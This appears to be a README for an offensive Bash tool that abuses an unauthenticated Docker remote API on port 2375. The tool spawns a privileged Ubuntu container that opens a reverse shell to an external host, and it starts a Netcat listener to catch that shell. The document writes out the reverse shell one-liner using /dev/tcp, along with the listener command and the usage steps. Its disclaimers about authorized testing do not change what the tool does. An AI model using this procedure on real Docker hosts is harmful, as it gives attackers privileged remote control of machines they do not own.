🐚 Docker Reverse Shell Initializer
This Bash script automates the creation of a privileged Ubuntu container on a remote Docker host (exposed via the Docker API on port 2375), configured to initiate a one-shot reverse shell to a specified remote host and port. It also launches a local Netcat listener to catch the shell.

⚠️ Intended for educational and authorized use only. Unauthorized access or control of systems is illegal.

🚀 Features
Pulls the official ubuntu:22.04 image.

Creates a privileged container with a reverse shell command.

Starts a Netcat listener on your local machine.

Keeps the container alive even after the reverse shell session ends.

Uses the Docker remote API (unauthenticated, port 2375).

🛠 Requirements
Docker daemon on remote host exposed at tcp://<IP>:2375

Local tools:

bash

curl

nc (Netcat)

Terminal emulator (one of: gnome-terminal, x-terminal-emulator, or xterm)

📦 Usage
Make the script executable:

bash
Copy
Edit
chmod +x docker-rev-shell.sh
Run the script:

bash
Copy
Edit
./docker-rev-shell.sh
Provide the following when prompted:

Docker host IP (e.g. 192.168.1.10)

Reverse shell destination (e.g. proxy50.rt3.io)

Port for the reverse connection (e.g. 32532)

📡 How It Works
A listener (nc -lvnp 4444) is started in a new terminal window.

The script:

Pulls the Ubuntu Docker image.

Creates a container with:

bash
Copy
Edit
bash -i >& /dev/tcp/$PROXY_HOST/$PROXY_PORT 0>&1; exec sleep infinity
Starts the container to initiate the reverse shell.

The reverse shell will connect to $PROXY_HOST:$PROXY_PORT, while your listener waits on port 4444.

⚠️ Security Notice
Exposing the Docker API on port 2375 without authentication is a critical security risk. This script assumes that you have authorized access to the Docker host.

📄 Disclaimer
This tool is for authorized penetration testing, research, or educational purposes only. Misuse of this script may lead to criminal charges. Always obtain explicit permission before interacting with systems you do not own.
